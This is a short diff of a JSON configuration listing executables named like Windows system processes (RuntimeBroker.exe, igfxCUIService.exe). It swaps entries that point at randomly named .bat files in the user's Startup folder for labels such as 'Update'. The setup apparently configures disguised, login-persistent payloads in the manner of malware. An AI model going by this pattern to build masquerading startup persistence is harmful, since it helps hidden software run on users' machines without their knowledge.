@@ -4,12 +4,12 @@
             [
                 "/GlobalNet/contents/Files/Pc/RuntimeBroker.exe",
                 "/RuntimeBroker.exe",
-                "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/bqNfejtWm.bat"
+                "Update"
             ],
             [
                 "/GlobalNet/contents/Files/Pc/igfxCUIService.exe",
                 "/igfxCUIService.exe",
-                "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/ljmUyVPTB.bat"
+                "Display"
             ]
         ]
     },
